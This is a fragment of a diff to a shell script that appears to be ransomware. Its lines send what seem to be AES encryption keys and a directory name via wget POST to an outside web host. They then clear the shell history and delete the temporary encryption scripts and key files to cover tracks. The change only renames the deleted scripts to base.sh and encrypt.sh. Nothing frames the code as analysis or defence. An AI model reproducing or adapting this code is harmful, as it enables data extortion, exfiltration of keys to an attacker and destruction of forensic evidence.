@@ -11,8 +11,8 @@ wget --post-data "dir=$hd&Key1=$l&key2=$m" http://youwebsite.com/post.php > /dev
 history -c > /dev/null 2>&1
 history -w > /dev/null 2>&1
 rm ~/.bash_history > /dev/null 2>&1
-rm /tmp/wow.sh > /dev/null 2>&1
-rm /tmp/wow2.sh > /dev/null 2>&1
+rm /tmp/base.sh > /dev/null 2>&1
+rm /tmp/encrypt.sh > /dev/null 2>&1
 rm /tmp/AesKey1.txt > /dev/null 2>&1
 rm /tmp/AesKey2.txt > /dev/null 2>&1
 
